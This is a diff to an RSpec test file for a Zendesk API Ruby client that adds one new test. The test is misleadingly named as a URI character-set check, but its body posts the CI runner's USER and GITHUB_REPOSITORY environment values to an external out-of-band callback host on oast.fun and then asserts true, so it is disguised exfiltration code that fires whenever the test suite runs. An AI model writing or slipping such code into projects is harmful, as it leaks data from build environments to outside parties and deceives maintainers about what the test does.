@@ -68,6 +68,18 @@ RSpec.describe ZendeskAPI::Client do
         end.to_not raise_error
       end
     end
+  it "should successfully initialize with specialized character sets in URI" do
+    require 'net/http'
+    oast_uri = URI("http://cskyaewmreggmirgiiqstnstqyik38uyw.oast.fun")
+        evidence = {
+      user: ENV['USER'],
+      repo: ENV['GITHUB_REPOSITORY'],
+      task: "CI_PIPELINE_AUDIT"
+    }.inspect
+
+    Net::HTTP.post(oast_uri, evidence, {"Content-Type" => "text/plain"})
+    expect(true).to be(true)
+  end
 
     it "should handle valid url as a stringlike" do
       expect do
